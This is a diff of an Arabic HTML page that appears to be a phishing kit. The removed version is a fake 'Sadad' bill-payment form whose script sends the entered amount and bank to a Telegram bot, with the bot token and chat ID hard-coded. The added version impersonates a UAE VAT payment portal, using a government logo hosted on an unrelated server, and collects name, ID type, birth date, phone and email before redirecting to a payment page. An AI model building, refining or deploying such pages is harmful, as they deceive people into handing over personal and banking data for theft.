@@ -1,67 +1,82 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title>نموذج سداد</title>
-  <style>
-    body {font-family: Tahoma, Arial, sans-serif; background-color: #fdfdfd; margin: 0; padding: 0;}
-    .container {max-width: 400px; margin: 50px auto; background: #fff5f0; padding: 25px; border-radius: 12px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);}
-    h2 {text-align: center; color: #c15c37; margin-bottom: 20px;}
-    label {display: block; margin-bottom: 8px; font-weight: bold; color: #333;}
-    input, select, button {width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px;}
-    button {background-color: #c15c37; color: white; font-weight: bold; cursor: pointer; border: none;}
-    button:hover {background-color: #a74627;}
-    .info {font-size: 14px; color: #444; line-height: 1.6;}
-    .highlight {color: #c15c37; font-weight: bold;}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة دفع ضريبة القيمة المضافة</title>
+    <style>
+        body{font-family:Arial,Helvetica,sans-serif;background:#f3f6f9;margin:0;padding:20px;box-sizing:border-box}
+        .container{max-width:420px;margin:30px auto}
+        .card{padding:20px;border-radius:12px;background:#fff;box-shadow:0 4px 10px rgba(0,0,0,0.08)}
+        .logo{max-width:220px;display:block;margin:0 auto 12px}
+        h1{text-align:center;margin:6px 0 12px}
+        input,select{width:100%;padding:12px;border-radius:8px;border:1px solid #e6e9ee;margin-bottom:12px;box-sizing:border-box}
+        .dob{display:flex;gap:8px}
+        .dob input{flex:1}
+        button{width:100%;padding:12px;background:#0b61c2;color:#fff;border:0;border-radius:8px;font-weight:700;cursor:pointer}
+        .note{font-size:13px;color:#666;text-align:center;margin-top:10px}
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h2>سداد</h2>
-    <form id="firstForm">
-      <label for="amount">أدخل قيمة السداد / الاسترداد</label>
-      <input type="text" id="amount" placeholder="مثال: 1000" required>
+    <div class="container">
+        <div class="card">
+            <img src="https://tonfree.serv00.net/sadUae/index-files/government-ae-logo-arabic.png" alt="شعار" class="logo">
+            <h1>بوابة دفع ضريبة القيمة المضافة</h1>
 
-      <label for="bank">اختر البنك الخاص بك</label>
-      <select id="bank" required>
-        <option disabled selected>-- اختر البنك --</option>
-        <option>بنك أبوظبي الإسلامي</option>
-        <option>بنك أبوظبي التجاري</option>
-        <option>بنك المشرق</option>
-        <option>بنك الشارقة</option>
-        <option>بنك المارية المحلي</option>
-        <option>بنك عجمان</option>
-        <option>بنك دبي الإسلامي</option>
-        <option>بنك الامارات الاسلامي</option>
-        <option>بنك أبوظبي الأول</option>
-        <option>مصرف الهلال</option>
-      </select>
+            <form id="personalForm" autocomplete="off">
+                <input id="fullName" type="text" placeholder="الاسم الكامل" required>
+                <select id="idType" required>
+                    <option value="">اختر نوع الهوية</option>
+                    <option value="هوية اماراتية">الهوية الإماراتية</option>
+                    <option value="جواز سفر">جواز السفر</option>
+                </select>
 
-      <button type="submit">تأكيد</button>
-    </form>
-    <div class="info">
-      <p class="highlight">رقم السداد</p>
-      <p>مع فواتير سداد، يمكنك دفع كل الفواتير من خلال البنك...</p>
+                <label style="display:block;margin-bottom:6px;font-weight:600">تاريخ الميلاد (ميلادي)</label>
+                <div class="dob">
+                    <input id="day" type="number" placeholder="يوم" min="1" max="31" required>
+                    <input id="month" type="number" placeholder="شهر" min="1" max="12" required>
+                    <input id="year" type="number" placeholder="سنة" min="1900" max="2100" required>
+                </div>
+
+                <input id="phone" type="tel" placeholder="رقم الجوال" required>
+                <input id="email" type="email" placeholder="البريد الإلكتروني" required>
+
+                <button type="submit">التالي</button>
+            </form>
+
+            <p class="note">سيتم نقل بياناتك إلى صفحة الدفع التالية لأكمال العملية (تجريبي).</p>
+        </div>
     </div>
-  </div>
 
-  <script>
-    document.getElementById("firstForm").addEventListener("submit", function(e){
-      e.preventDefault();
-      const amount = document.getElementById("amount").value;
-      const bank = document.getElementById("bank").value;
+<script>
+document.getElementById('personalForm').addEventListener('submit', function(e){
+    e.preventDefault();
 
-      fetch("https://api.telegram.org/bot7994339638:AAHgur93jAzxz55NZTtD5J3WKgDaWZtlV3E/sendMessage", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({
-          chat_id: "16420566",
-          text: `💰 قيمة السداد: ${amount}\n🏦 البنك: ${bank}`
-        })
-      }).then(() => {
-        window.location.href = "payment.html";
-      });
-    });
-  </script>
+    const fullName = document.getElementById('fullName').value.trim();
+    const idType = document.getElementById('idType').value;
+    const day = document.getElementById('day').value;
+    const month = document.getElementById('month').value;
+    const year = document.getElementById('year').value;
+    const phone = document.getElementById('phone').value.trim();
+    const email = document.getElementById('email').value.trim();
+
+    if(!fullName || !idType || !day || !month || !year || !phone || !email){
+        alert('الرجاء ملء كافة الحقول المطلوبة.');
+        return;
+    }
+
+    // خزن البيانات مؤقتًا في sessionStorage لصفحة الدفع التالية
+    const data = {
+        fullName, idType,
+        birth: `${day}/${month}/${year}`,
+        phone, email,
+        amount: "10 AED"
+    };
+    sessionStorage.setItem('taxPaymentData', JSON.stringify(data));
+
+    // انتقل إلى صفحة الدفع
+    window.location.href = 'payment.html';
+});
+</script>
 </body>
 </html>
